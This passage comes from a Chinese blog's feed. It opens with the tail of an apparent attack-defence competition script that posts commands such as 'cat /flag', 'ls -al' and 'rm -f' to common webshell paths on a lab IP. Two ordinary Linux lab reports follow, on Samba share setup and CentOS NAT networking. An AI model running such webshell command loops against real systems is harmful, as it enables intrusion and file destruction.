    &lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;shell.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;x.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;index.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;web.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
    payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;cat /flag&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ls -al&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;rm -f&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;echo 1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8802&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8804&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ii &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http://192.168.76.156:&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;ii
                &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; iii &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; payload&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                    data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
                        &lt;span class=&#34;token string&#34;&gt;&#39;payload&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;iii
                    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
                    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                        requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;正在搅屎:&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;|&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;ii&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;|&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;iii&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                        &lt;span class=&#34;token keyword&#34;&gt;pass&lt;/span&gt;


&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    scan_attack&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;最后的最后，准备 - 漏洞资源 - 漏洞资料库（比赛能不能联网无法确定，如刚结束的河南省赛，虽然允许联网，但是大部分博客平台被加入了黑名单）&lt;/p&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/</id>
        <title>Samba共享</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/"/>
        <content type="html">&lt;h2 id=&#34;实验2samba服务器配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实验2samba服务器配置&#34;&gt;#&lt;/a&gt; 实验 2：Samba 服务器配置&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;实验目的&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、了解 Samba 协议，理解 Samba 的工作原理&lt;/p&gt;
&lt;p&gt;3、熟练掌握 Samba 服务器的配置和故障排除的思路、方法技巧&lt;/p&gt;
&lt;p&gt;4、深入理解 Linux 的文件权限管理&lt;/p&gt;
&lt;p&gt;4、掌握防火墙 Firewall 的基本配置&lt;/p&gt;
&lt;p&gt;5、初步学会配置 SELinux&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;实验参考&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;实验步骤可参考《2-1-Samba 服务器配置匿名共享.pdf》文件。&lt;/p&gt;
&lt;p&gt;实验步骤可参考《2-2-Samba 服务器配置_安全共享.pdf》文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;1实验要求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1实验要求&#34;&gt;#&lt;/a&gt; 1. 实验要求&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;任务 1：配置 yum 源，使用光盘镜像或者阿里云的 YUM 源安装 Samba 服务包。&lt;br /&gt;
任务 2：Samba 匿名访问（不需要密码的分享），物理主机匿名访问 Samba 服务器上的共享目录 /tmp 和 /share。&lt;/p&gt;
&lt;p&gt;任务 3：Samba 服务器配置_安全共享。一个小组（公司技术部）共同开发一个项目，所有的项目文件都存放在 Samba 服务器一个共享目录 (/home/project)。要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;公司每位成员使用用户名 / 密码访问 Samba 共享服务器，但只有技术部的成员可以访问部门的共享目录 /home/project。&lt;/li&gt;
&lt;li&gt;技术部每位成员在共享目录 /home/project 新建的文件都属于技术部组。&lt;/li&gt;
&lt;li&gt;技术部每位成员都可以对其他用户建立的文件进行读写操作，但每位用户只能删除自己的文件，不能删除其他用户建立的文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其他要求：&lt;/p&gt;
&lt;p&gt;虚拟机主机名为 “Samba-xxx”，其中 xxx 为自己的姓名拼音简写；测试客户端的主机名修改为 “Client-xxx”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;2实验过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2实验过程&#34;&gt;#&lt;/a&gt; 2. 实验过程&lt;/h3&gt;
&lt;h4 id=&#34;21-yum源配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-yum源配置&#34;&gt;#&lt;/a&gt; 2.1 yum 源配置&lt;/h4&gt;
&lt;p&gt;首先将进入到配置目录，将原有的仓库文件进行一个备份&lt;/p&gt;
&lt;p&gt;先创建一个文件夹来存放备份的文件，如下图 1-1&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTEzMDc2MTMucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022211307613.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20221022211307613&amp;quot; style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;​																			图 1-1，建立文件夹&lt;/p&gt;
&lt;p&gt;将文件移动进去后，配置一个阿里的 yum 源，如图 1-2&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTI0NDc0ODEucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022212447481.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20221022212447481&amp;quot; style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;​                                                                                 图 1-2，yum 源配置&lt;/p&gt;
&lt;h4 id=&#34;22-samba匿名共享&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-samba匿名共享&#34;&gt;#&lt;/a&gt; 2.2 Samba 匿名共享&lt;/h4&gt;
&lt;h5 id=&#34;221-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#221-环境准备&#34;&gt;#&lt;/a&gt; 2.2.1 环境准备&lt;/h5&gt;
&lt;p&gt;应老师要求这里不关闭防火墙和 SELinux&lt;/p&gt;
&lt;p&gt;建立一个共享目录 /public，安装 samba 服务程序包如图 2-1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022213412121.png&#34; alt=&#34;image-20221022213412121&#34; /&gt;&lt;/p&gt;
&lt;p&gt;​                                                                                 图 2-1，环境准备&lt;/p&gt;
&lt;h5 id=&#34;222-修改配置文件etcsambasmbconf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-修改配置文件etcsambasmbconf&#34;&gt;#&lt;/a&gt; 2.2.2 修改配置文件 /etc/samba/smb.conf&lt;/h5&gt;
&lt;p&gt;进入 samba 目录，将源文件备份，修改 smb.conf 文件如图 2-2&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214043968.png&#34; alt=&#34;image-20221022214043968&#34; /&gt;&lt;/p&gt;
&lt;p&gt;​                                                                    图 2-2，修改配置文件&lt;/p&gt;
&lt;p&gt;修改配置文件内如如下图 2-3&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214220044.png&#34; alt=&#34;image-20221022214220044&#34; /&gt;&lt;/p&gt;
&lt;p&gt;​                                                                      图 2-3，配置文件内容&lt;/p&gt;
&lt;h5 id=&#34;223启动环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#223启动环境&#34;&gt;#&lt;/a&gt; 2.2.3 启动环境&lt;/h5&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;[root@Samba-lq samba]# testparm #语法检查
[root@Samba-lq samba]# service nmb start #开启nmb服务
[root@Samba-lq samba]# service smb start #开启smb服务&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;检查语法如下图 2-4&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214900363.png&#34; alt=&#34;image-20221022214900363&#34; /&gt;&lt;/p&gt;
&lt;p&gt;​                                                                          图 2-4，语法测试&lt;/p&gt;
&lt;p&gt;开启 nmb 和 smb 服务如图 2-5&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214957516.png&#34; alt=&#34;image-20221022214957516&#34; /&gt;&lt;/p&gt;
&lt;p&gt;​                                                                          图 2-5，开启服务&lt;/p&gt;
&lt;h5 id=&#34;224设置防火墙规则和selinux规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#224设置防火墙规则和selinux规则&#34;&gt;#&lt;/a&gt; 2.2.4 设置防火墙规则和 SELinux 规则&lt;/h5&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;[root@Samba-lq samba]# firewall-cmd --permanent --zone&amp;#x3D;public --add-service&amp;#x3D;samba
[root@Samba-lq samba]# firewall-cmd --reload
[root@Samba-lq samba]# firewall-cmd --list-services
[root@Samba-lq samba]# chcon -t samba_share_t &amp;#x2F;public&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;配置如下图 2-5&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221106832.png&#34; alt=&#34;image-20221022221106832&#34; /&gt;&lt;/p&gt;
&lt;p&gt;​																		图 2-5，配置效果图&lt;/p&gt;
&lt;h5 id=&#34;225共享目录进入要密码解决&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#225共享目录进入要密码解决&#34;&gt;#&lt;/a&gt; 2.2.5 共享目录进入要密码解决&lt;/h5&gt;
&lt;p&gt;问题截图如下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221620593.png&#34; alt=&#34;image-20221022221620593&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里因为我使用的是老师给的配置文件，发现配置文件在 public 的配置中没有 guest ok 允许匿名共享&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221815533.png&#34; alt=&#34;image-20221022221815533&#34; /&gt;&lt;/p&gt;
&lt;p&gt;tmp 能够正常访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221859980.png&#34; alt=&#34;image-20221022221859980&#34; /&gt;&lt;/p&gt;
&lt;p&gt;修改后能正常访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222048533.png&#34; alt=&#34;image-20221022222048533&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;226共享目录不能正常写入文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#226共享目录不能正常写入文件&#34;&gt;#&lt;/a&gt; 2.2.6 共享目录不能正常写入文件&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222139179.png&#34; alt=&#34;image-20221022222139179&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里是因为 public 权限问题，这里更改权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222345913.png&#34; alt=&#34;image-20221022222345913&#34; /&gt;&lt;/p&gt;
&lt;p&gt;更改后能够正常访问文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222414216.png&#34; alt=&#34;image-20221022222414216&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;23samba安全共享&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23samba安全共享&#34;&gt;#&lt;/a&gt; 2.3Samba 安全共享&lt;/h4&gt;
&lt;h5 id=&#34;231环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#231环境准备&#34;&gt;#&lt;/a&gt; 2.3.1 环境准备&lt;/h5&gt;
&lt;p&gt;关闭防火墙和 SELinux&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230620906.png&#34; alt=&#34;image-20221022230620906&#34; /&gt;&lt;/p&gt;
&lt;p&gt;创建共享目录并设置权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230755058.png&#34; alt=&#34;image-20221022230755058&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;232修改配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#232修改配置文件&#34;&gt;#&lt;/a&gt; 2.3.2 修改配置文件&lt;/h5&gt;
&lt;p&gt;进入 /etc/samba 目录修改 smb.conf 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231259199.png&#34; alt=&#34;image-20221022231259199&#34; /&gt;&lt;/p&gt;
&lt;p&gt;重启服务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231355253.png&#34; alt=&#34;image-20221022231355253&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;233创建共享用户根据权限访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#233创建共享用户根据权限访问&#34;&gt;#&lt;/a&gt; 2.3.3 创建共享用户，根据权限访问&lt;/h5&gt;
&lt;p&gt;创建系统用户&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221022231649122.png&#34; alt=&#34;image-20221022231649122&#34; /&gt;&lt;/p&gt;
&lt;p&gt;修改系统用户密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232021237.png&#34; alt=&#34;image-20221022232021237&#34; /&gt;&lt;/p&gt;
&lt;p&gt;创建管理 shamab 用户（使用 pdbedit 管理 Samba）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232202251.png&#34; alt=&#34;image-20221022232202251&#34; /&gt;&lt;/p&gt;
&lt;p&gt;查看所有的共享用户&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232421854.png&#34; alt=&#34;image-20221022232421854&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2.3.4windows 客户端利用账户 lisi 访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235143521.png&#34; alt=&#34;image-20221022234754805&#34; /&gt;&lt;/p&gt;
&lt;p&gt;创建测试文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235324326.png&#34; alt=&#34;image-20221022235324326&#34; /&gt;&lt;/p&gt;
&lt;p&gt;linu 上面用张三登录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235809958.png&#34; alt=&#34;image-20221022235809958&#34; /&gt;&lt;/p&gt;
&lt;p&gt;利用账号 zhangsan 挂载目录到本地&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000130466.png&#34; alt=&#34;image-20221023000130466&#34; /&gt;&lt;/p&gt;
&lt;p&gt;进入挂载目录创建目录文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000217590.png&#34; alt=&#34;image-20221023000217590&#34; /&gt;&lt;/p&gt;
&lt;p&gt;给共享目录设置防删除位&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000438265.png&#34; alt=&#34;image-20221023000438265&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;test-one&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#test-one&#34;&gt;#&lt;/a&gt; test-one&lt;/h5&gt;
&lt;p&gt;windows 账号 lisi 删除 zhangsan 创建的文件失败&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000515094.png&#34; alt=&#34;image-20221023000515094&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;test-two&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#test-two&#34;&gt;#&lt;/a&gt; test-two&lt;/h5&gt;
&lt;p&gt;zhangsan 删除 lisi 用户文件失败&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000623905.png&#34; alt=&#34;image-20221023000623905&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;3实验小结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3实验小结&#34;&gt;#&lt;/a&gt; 3. 实验小结&lt;/h3&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/</id>
        <title>nat模式+ip分配</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/"/>
        <content type="html">&lt;h2 id=&#34;实验1centos-8安装-网络配置-远程访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实验1centos-8安装-网络配置-远程访问&#34;&gt;#&lt;/a&gt; 实验 1：CentOS 8 安装、网络配置、远程访问&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;实验目的&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、掌握 Linux 虚拟机的安装方法；&lt;/p&gt;
&lt;p&gt;2、掌握 Linux 网络配置方法；&lt;/p&gt;
&lt;p&gt;3、掌握远程访问 Linux 系统的方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;1实验要求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1实验要求&#34;&gt;#&lt;/a&gt; 1. 实验要求&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;任务 1：安装虚拟机；（实验过程可以省略）&lt;br /&gt;
任务 2：安装 CentOS 8（建议：最小化安装）； （安装成功后的截图即可）&lt;/p&gt;
&lt;p&gt;任务 3：配置网络为 NAT 模式，实现物理机与虚拟机的相互访问。（要求：IP 地址段为学号后两位，即 192.168. 学号.**）&lt;br /&gt;
（1）	虚拟机配置为动态 IP 地址，Ping 物理主机测试连通性。&lt;/p&gt;
&lt;p&gt;（2）	虚拟机配置为静态 IP 地址，Ping 物理主机测试连通性。&lt;/p&gt;
&lt;p&gt;任务 4：Windows 主机上安装 Xhell，实现远程访问 CentOS 8 系统。&lt;/p&gt;
&lt;p&gt;任务 5：两台 Linux 相互登陆（可以克隆出另一台 CentOS8，也可以使用其他的 Linux)。参考《跟阿铭学 Linux  第 3 版.pdf》P45，3.3 节 两台 Linux 相互登陆。&lt;/p&gt;
&lt;p&gt;任务 6：完成后，虚拟机 “拍快照” 保存当前状态。（实验过程可以省略）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;2实验过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2实验过程&#34;&gt;#&lt;/a&gt; 2. 实验过程&lt;/h3&gt;
&lt;h4 id=&#34;21-安装centos-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-安装centos-8&#34;&gt;#&lt;/a&gt; 2.1 安装 CentOS 8&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2lzb3JlZGlyZWN0LmNlbnRvcy5vcmcvY2VudG9zLzcvaXNvcy94ODZfNjQv&#34;&gt;CentOS Mirrors List&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;用上面的链接下载镜像，并安装&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MTQyMzA4MjM4NjYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914230823866.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220914230823866&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
